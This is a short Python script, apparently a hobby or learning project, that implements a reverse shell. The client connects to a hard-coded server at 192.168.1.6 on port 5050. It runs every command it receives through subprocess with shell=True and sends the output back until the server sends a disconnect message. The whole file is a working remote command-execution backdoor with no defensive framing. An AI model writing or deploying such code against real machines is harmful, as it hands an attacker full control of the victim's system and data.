import socket
import subprocess

HEADER = 64
PORT = 5050
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = "192.168.1.6"
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


run = True
while (run):
    cmdlet = client.recv(2048).decode(FORMAT)
    if(cmdlet == DISCONNECT_MESSAGE):
        print("SERVER DISCONNECTED")
        run = False
        break

    try:
        result = subprocess.check_output(cmdlet, shell=True)
        client.send(str(result).encode(FORMAT))
    except:
        client.send("invalid command".encode(FORMAT))
client.close()
